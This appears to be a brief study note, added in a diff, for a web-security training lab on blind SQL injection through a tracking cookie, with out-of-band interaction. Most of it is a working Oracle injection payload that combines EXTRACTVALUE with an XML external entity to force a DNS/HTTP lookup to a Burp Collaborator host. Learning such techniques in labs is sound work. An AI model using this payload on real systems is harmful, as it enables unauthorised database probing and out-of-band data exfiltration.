@@ -1,0 +1,11 @@
+Lab #15: Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goal - Exploit SQLi and cause a dns lookup
+
+DNS lookup using burp collabolator :
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE 
+root [ <!ENTITY % remote SYSTEM "http://zwz04mt43zwjlkpuevixwhmwun0eo3.oastify.com"> 
+%remote;]>'),'/l') FROM dual)--
